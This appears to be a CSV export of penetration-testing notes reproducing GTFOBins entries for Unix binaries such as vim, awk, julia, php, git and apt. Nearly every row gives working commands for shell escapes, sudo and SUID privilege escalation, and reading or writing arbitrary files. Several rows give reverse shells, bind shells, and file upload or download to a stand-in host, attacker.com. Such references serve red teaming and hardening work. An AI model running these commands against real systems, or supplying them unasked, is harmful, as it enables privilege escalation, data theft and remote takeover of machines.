Tools,Service,Port,Syntax & Description,Tags,MITRE ATT&CK
https://www.notion.sovolatility.md,GTFOBins,,"shell: volatility -f file.dump volshell
__import__('os').system('/bin/sh')","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soapt.md,GTFOBins,,"shell: apt changelog apt
!/bin/sh

sudo: sudo apt changelog apt
!/bin/sh

sudo: TF=$(mktemp)
echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' > $TF
sudo apt install -c $TF sl

sudo: sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soascii85.md,GTFOBins,,"file-read: LFILE=file_to_read
ascii85 ""$LFILE"" | ascii85 --decode

sudo: LFILE=file_to_read
sudo ascii85 ""$LFILE"" | ascii85 --decode","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sofold.md,GTFOBins,,"file-read: LFILE=file_to_read
fold -w99999999 ""$LFILE""

suid: LFILE=file_to_read
./fold -w99999999 ""$LFILE""

sudo: LFILE=file_to_read
sudo fold -w99999999 ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.solatexmk.md,GTFOBins,,"shell: latexmk -e 'exec ""/bin/sh"";'

shell: latexmk -latex='/bin/sh #' /dev/null

file-read: latexmk -e 'open(X,""/etc/passwd"");while(<X>){print $_;}exit'

file-read: TF=$(mktemp)
echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' >$TF
strings tmp.dvi

sudo: sudo latexmk -e 'exec ""/bin/sh"";'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sotbl.md,GTFOBins,,"file-read: LFILE=file_to_read
tbl $LFILE

suid: LFILE=file_to_read
./tbl $LFILE

sudo: LFILE=file_to_read
sudo tbl $LFILE","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.somsgattrib.md,GTFOBins,,"file-read: LFILE=file_to_read
msgattrib -P $LFILE

sudo: LFILE=file_to_read
sudo msgattrib -P $LFILE

suid: LFILE=file_to_read
./msgattrib -P $LFILE","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sopandoc.md,GTFOBins,,"file-read: LFILE=file_to_read
pandoc -t plain ""$LFILE""

file-write: LFILE=file_to_write
echo DATA | pandoc -t plain -o ""$LFILE""

shell: TF=$(mktemp)
echo 'os.execute(""/bin/sh"")' >$TF
pandoc -L $TF /dev/null

suid: LFILE=file_to_write
echo DATA | ./pandoc -t plain -o ""$LFILE""

limited-suid: TF=$(mktemp)
echo 'os.execute(""/bin/sh"")' >$TF
./pandoc -L $TF /dev/null

sudo: TF=$(mktemp)
echo 'os.execute(""/bin/sh"")' >$TF
sudo pandoc -L $TF /dev/null","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sonawk.md,GTFOBins,,"shell: nawk 'BEGIN {system(""/bin/sh"")}'
non-interactive-reverse-shell: RHOST=attacker.com
RPORT=12345
nawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
    s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;
    while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'

non-interactive-bind-shell: LPORT=12345
nawk -v LPORT=$LPORT 'BEGIN {
    s = ""/inet/tcp/"" LPORT ""/0/0"";
    while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'

file-write: LFILE=file_to_write
nawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'

file-read: LFILE=file_to_read
nawk '//' ""$LFILE""

suid: LFILE=file_to_read
./nawk '//' ""$LFILE""

sudo: sudo nawk 'BEGIN {system(""/bin/sh"")}'
limited-suid: ./nawk 'BEGIN {system(""/bin/sh"")}'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.socomm.md,GTFOBins,,"file-read: LFILE=file_to_read
comm $LFILE /dev/null 2>/dev/null

suid: LFILE=file_to_read
comm $LFILE /dev/null 2>/dev/null

sudo: LFILE=file_to_read
sudo comm $LFILE /dev/null 2>/dev/null","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.socheck_cups.md,GTFOBins,,"file-read: LFILE=file_to_read
check_cups --extra-opts=@$LFILE

sudo: LFILE=file_to_read
sudo check_cups --extra-opts=@$LFILE","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sostrings.md,GTFOBins,,"file-read: LFILE=file_to_read
strings ""$LFILE""

suid: LFILE=file_to_read
./strings ""$LFILE""

sudo: LFILE=file_to_read
sudo strings ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sojulia.md,GTFOBins,,"shell: julia -e 'run(`/bin/sh`)'

file-read: export LFILE=file_to_read
julia -e 'print(open(f->read(f, String), ENV[""LFILE""]))'

file-write: export LFILE=file_to_write
julia -e 'open(f->write(f, ""DATA""), ENV[""LFILE""], ""w"")'

file-download: export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
julia -e 'download(ENV[""URL""], ENV[""LFILE""])'

reverse-shell: export RHOST=attacker.com
export RPORT=12345
julia -e 'using Sockets; sock=connect(ENV[""RHOST""], parse(Int64,ENV[""RPORT""])); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'

suid: ./julia -e 'run(`/bin/sh -p`)'

sudo: sudo julia -e 'run(`/bin/sh`)'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soghci.md,GTFOBins,,"shell: ghci
System.Process.callCommand ""/bin/sh""

sudo: sudo ghci
System.Process.callCommand ""/bin/sh""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sorvim.md,GTFOBins,,"shell: rvim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'
shell: rvim -c ':lua os.execute(""reset; exec sh"")'
reverse-shell: export RHOST=attacker.com
export RPORT=12345
rvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")
vim.command("":q!"")'

non-interactive-reverse-shell: export RHOST=attacker.com
export RPORT=12345
rvim -c ':lua local s=require(""socket""); local t=assert(s.tcp());
  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,""r""));
    local b=assert(f:read(""*a""));t:send(b);
  end;
  f:close();t:close();'

non-interactive-bind-shell: export LPORT=12345
rvim -c ':lua local k=require(""socket"");
  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,""r""));
    local b=assert(f:read(""*a""));c:send(b);
  end;c:close();f:close();'

file-upload: export URL=http://attacker.com/
export LFILE=file_to_send
rvim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))
vim.command("":q!"")'

file-upload: export LPORT=8888
rvim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command("":q!"")'

file-upload: export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
rvim -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')
  local d=f:read(""*a"")
  io.close(f);
  local s=require(""socket"");
  local t=assert(s.tcp());
  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
  t:send(d);
  t:close();'

file-download: export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
rvim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])
vim.command("":q!"")'

file-download: export LPORT=12345
export LFILE=file_to_save
rvim -c ':lua local k=require(""socket"");
  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
  local c=s:accept();
  local d,x=c:receive(""*a"");
  c:close();
  local f=io.open(os.getenv(""LFILE""), ""wb"");
  f:write(d);
  io.close(f);'

file-write: rvim file_to_write
iDATA
^[
w

file-read: rvim file_to_read
library-load: rvim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'
suid: ./rvim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'
sudo: sudo rvim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'
sudo: sudo rvim -c ':lua os.execute(""reset; exec sh"")'
capabilities: ./rvim -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'
limited-suid: ./rvim -c ':lua os.execute(""reset; exec sh"")'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sotask.md,GTFOBins,,"shell: task execute /bin/sh
sudo: sudo task execute /bin/sh","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sowatch.md,GTFOBins,,"shell: watch -x sh -c 'reset; exec sh 1>&0 2>&0'
suid: ./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'
sudo: sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'
limited-suid: ./watch 'reset; exec sh 1>&0 2>&0'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sotail.md,GTFOBins,,"file-read: LFILE=file_to_read
tail -c1G ""$LFILE""

suid: LFILE=file_to_read
./tail -c1G ""$LFILE""

sudo: LFILE=file_to_read
sudo tail -c1G ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.souudecode.md,GTFOBins,,"file-read: LFILE=file_to_read
uuencode ""$LFILE"" /dev/stdout | uudecode

suid: LFILE=file_to_read
uuencode ""$LFILE"" /dev/stdout | uudecode

sudo: LFILE=file_to_read
sudo uuencode ""$LFILE"" /dev/stdout | uudecode","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soxetex.md,GTFOBins,,"shell: xetex --shell-escape '\write18{/bin/sh}\end'

sudo: sudo xetex --shell-escape '\write18{/bin/sh}\end'

limited-suid: ./xetex --shell-escape '\write18{/bin/sh}\end'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sozathura.md,GTFOBins,,"shell: zathura
:! /bin/sh -c 'exec /bin/sh 0<&1'

sudo: sudo zathura
:! /bin/sh -c 'exec /bin/sh 0<&1'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sovim.md,GTFOBins,,"shell: vim -c ':!/bin/sh'
shell: vim --cmd ':set shell=/bin/sh|:shell'
shell: vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'
shell: vim -c ':lua os.execute(""reset; exec sh"")'
reverse-shell: export RHOST=attacker.com
export RPORT=12345
vim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")
vim.command("":q!"")'

non-interactive-reverse-shell: export RHOST=attacker.com
export RPORT=12345
vim -c ':lua local s=require(""socket""); local t=assert(s.tcp());
  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,""r""));
    local b=assert(f:read(""*a""));t:send(b);
  end;
  f:close();t:close();'

non-interactive-bind-shell: export LPORT=12345
vim -c ':lua local k=require(""socket"");
  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,""r""));
    local b=assert(f:read(""*a""));c:send(b);
  end;c:close();f:close();'

file-upload: export URL=http://attacker.com/
export LFILE=file_to_send
vim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))
vim.command("":q!"")'

file-upload: export LPORT=8888
vim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command("":q!"")'

file-upload: export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
vim -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')
  local d=f:read(""*a"")
  io.close(f);
  local s=require(""socket"");
  local t=assert(s.tcp());
  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
  t:send(d);
  t:close();'

file-download: export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
vim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])
vim.command("":q!"")'

file-download: export LPORT=12345
export LFILE=file_to_save
vim -c ':lua local k=require(""socket"");
  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
  local c=s:accept();
  local d,x=c:receive(""*a"");
  c:close();
  local f=io.open(os.getenv(""LFILE""), ""wb"");
  f:write(d);
  io.close(f);'

file-write: vim file_to_write
iDATA
^[
w

file-read: vim file_to_read
library-load: vim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'
suid: ./vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'
sudo: sudo vim -c ':!/bin/sh'
sudo: sudo vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'
sudo: sudo vim -c ':lua os.execute(""reset; exec sh"")'
capabilities: ./vim -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'
limited-suid: ./vim -c ':lua os.execute(""reset; exec sh"")'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sopaste.md,GTFOBins,,"file-read: LFILE=file_to_read
paste $LFILE

suid: LFILE=file_to_read
paste $LFILE

sudo: LFILE=file_to_read
sudo paste $LFILE","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sogit.md,GTFOBins,,"shell: PAGER='sh -c ""exec sh 0<&1""' git -p help
shell: git help config
!/bin/sh

shell: git branch --help config
!/bin/sh

shell: TF=$(mktemp -d)
git init ""$TF""
echo 'exec /bin/sh 0<&2 1>&2' >""$TF/.git/hooks/pre-commit.sample""
mv ""$TF/.git/hooks/pre-commit.sample"" ""$TF/.git/hooks/pre-commit""
git -C ""$TF"" commit --allow-empty -m x

shell: TF=$(mktemp -d)
ln -s /bin/sh ""$TF/git-x""
git ""--exec-path=$TF"" x

file-read: LFILE=file_to_read
git diff /dev/null $LFILE

file-write: git apply --unsafe-paths --directory / x.patch

sudo: sudo PAGER='sh -c ""exec sh 0<&1""' git -p help
sudo: sudo git -p help config
!/bin/sh

sudo: sudo git branch --help config
!/bin/sh

sudo: TF=$(mktemp -d)
git init ""$TF""
echo 'exec /bin/sh 0<&2 1>&2' >""$TF/.git/hooks/pre-commit.sample""
mv ""$TF/.git/hooks/pre-commit.sample"" ""$TF/.git/hooks/pre-commit""
sudo git -C ""$TF"" commit --allow-empty -m x

sudo: TF=$(mktemp -d)
ln -s /bin/sh ""$TF/git-x""
sudo git ""--exec-path=$TF"" x

limited-suid: PAGER='sh -c ""exec sh 0<&1""' ./git -p help","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soaspell.md,GTFOBins,,"file-read: LFILE=file_to_read
aspell -c ""$LFILE""

suid: LFILE=file_to_read
./aspell -c ""$LFILE""

sudo: LFILE=file_to_read
sudo aspell -c ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.socowsay.md,GTFOBins,,"shell: TF=$(mktemp)
echo 'exec ""/bin/sh"";' >$TF
cowsay -f $TF x

sudo: TF=$(mktemp)
echo 'exec ""/bin/sh"";' >$TF
sudo cowsay -f $TF x","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sohead.md,GTFOBins,,"file-read: LFILE=file_to_read
head -c1G ""$LFILE""

suid: LFILE=file_to_read
./head -c1G ""$LFILE""

sudo: LFILE=file_to_read
sudo head -c1G ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sofile.md,GTFOBins,,"file-read: LFILE=file_to_read
file -f $LFILE

file-read: LFILE=file_to_read
file -m $LFILE

suid: LFILE=file_to_read
./file -f $LFILE

sudo: LFILE=file_to_read
sudo file -f $LFILE","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sohd.md,GTFOBins,,"file-read: LFILE=file_to_read
hd ""$LFILE""

suid: LFILE=file_to_read
./hd ""$LFILE""

sudo: LFILE=file_to_read
sudo hd ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.soawk.md,GTFOBins,,"shell: awk 'BEGIN {system(""/bin/sh"")}'
non-interactive-reverse-shell: RHOST=attacker.com
RPORT=12345
awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
    s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;
    while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'

non-interactive-bind-shell: LPORT=12345
awk -v LPORT=$LPORT 'BEGIN {
    s = ""/inet/tcp/"" LPORT ""/0/0"";
    while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'

file-write: LFILE=file_to_write
awk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'

file-read: LFILE=file_to_read
awk '//' ""$LFILE""

suid: LFILE=file_to_read
./awk '//' ""$LFILE""

sudo: sudo awk 'BEGIN {system(""/bin/sh"")}'
limited-suid: ./awk 'BEGIN {system(""/bin/sh"")}'","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sowc.md,GTFOBins,,"file-read: LFILE=file_to_read
wc --files0-from ""$LFILE""

suid: LFILE=file_to_read
./wc --files0-from ""$LFILE""

sudo: LFILE=file_to_read
sudo wc --files0-from ""$LFILE""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sodos2unix.md,GTFOBins,,"file-write: LFILE1=file_to_read
LFILE2=file_to_write
dos2unix -f -n ""$LFILE1"" ""$LFILE2""","GTFOBins, LOTL (Living Off The Land)",
https://www.notion.sophp.md,GTFOBins,,"shell: export CMD=""/bin/sh""
php -r 'system(getenv(""CMD""));'

shell: export CMD=""/bin/sh""
php -r 'passthru(getenv(""CMD""));'

shell: export CMD=""/bin/sh""
php -r 'print(shell_exec(getenv(""CMD"")));'

shell: export CMD=""/bin/sh""
php -r '$r=array(); exec(getenv(""CMD""), $r); print(join(""\\n"",$r));'

shell: export CMD=""/bin/sh""
php -r '$h=@popen(getenv(""CMD""),""r""); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'

command: export CMD=""id""
php -r '$p = array(array(""pipe"",""r""),array(""pipe"",""w""),array(""pipe"", ""w""));$h = @proc_open(getenv(""CMD""), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'

reverse-shell: export RHOST=attacker.com
export RPORT=12345
php -r '$sock=fsockopen(getenv(""RHOST""),getenv(""RPORT""));exec(""/bin/sh -i <&3 >&3 2>&3"");'

file-upload: LHOST=0.0.0.0
LPORT=8888
php -S $LHOST:$LPORT

file-download: export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
php -r '$c=file_get_contents(getenv(""URL""));file_put_contents(getenv(""LFILE""), $c);'

suid: CMD=""/bin/sh""
./php -r ""pcntl_exec('/bin/sh', ['-p']);""

sudo: CMD=""/bin/sh""
sudo php -r ""system('$CMD');""

capabilities: CMD=""/bin/sh""
./php -r ""posix_setuid(0); system('$CMD');""

file-read: export LFILE=file_to_read
php -r 'readfile(getenv(""LFILE""));'

file-write: export LFILE=file_to_write
php -r 'file_put_contents(getenv(""LFILE""), ""DATA"");'","GTFOBins, LOTL (Living Off The Land)",
